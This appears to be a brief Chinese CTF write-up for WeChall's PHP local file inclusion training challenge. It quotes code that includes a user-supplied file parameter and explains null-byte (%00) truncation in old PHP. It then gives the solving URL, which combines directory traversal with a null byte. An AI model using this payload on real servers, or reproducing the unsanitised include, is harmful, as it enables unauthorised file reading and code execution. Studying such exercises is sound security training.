
* 题目
``` 
Your mission is to exploit this code, which has obviously an LFI vulnerability:

GeSHi`ed PHP code
1
2
$filename = 'pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome").'.html';
include $filename;


There is a lot of important stuff in ../solution.php, so please include and execute this file for us.

Here are a few examples of the script in action (in the box below):
index.php?file=welcome
index.php?file=news
index.php?file=forums

For debugging purposes, you may look at the whole source again, also as highlighted version.
```

* %00截断介绍
> %00截断，例如1.php%00.txt，白名单在测试时会直接将这个带入，判断后缀名（因为此时1.php%00.txt是一个字符串整体），但执行该代码时，会自动截断%00后面的内容，只要记住会删除包括%00及后面的所有内容

> php<5.3.4

* 答案
> http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00